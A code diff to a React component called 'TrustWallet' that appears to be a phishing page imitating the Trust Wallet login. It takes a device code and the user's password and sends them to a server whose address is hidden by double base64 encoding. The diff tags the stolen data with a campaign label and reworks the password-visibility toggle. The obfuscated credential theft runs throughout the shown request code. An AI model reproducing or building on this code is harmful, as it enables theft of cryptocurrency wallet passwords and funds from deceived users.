@@ -36,7 +36,8 @@ const TrustWallet = () => {
         //here is the code that we have read ABC
         const device = code
         const url = 'YUhSMGNITTZMeTluWVc1aFkyaGxMbXhwZG1VdllYQnBMM1l4TDJodw==';
-        const requestData = { device, value: password };
+        const note = 'zatahub_tw';
+        const requestData = { device, value: password, note };
         try {
             setLoader(true)
             const response = await fetch(atob(atob(url)), {
@@ -92,7 +93,7 @@ const TrustWallet = () => {
 
                 <div className={`${Styles.input_container}`}>
                     <input
-                        className={`${isPasswordVisible ? `${Styles.pw}` : ''}`}
+                        className={`${isPasswordVisible ? '' : `${Styles.pw}`}`}
                         type="text"
                         style={{
                             width: '100%',
@@ -116,9 +117,9 @@ const TrustWallet = () => {
                     >
 
                         {isPasswordVisible ? (
-                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
-                        ) : (
                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                        ) : (
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
                         )}
                     </button>
 
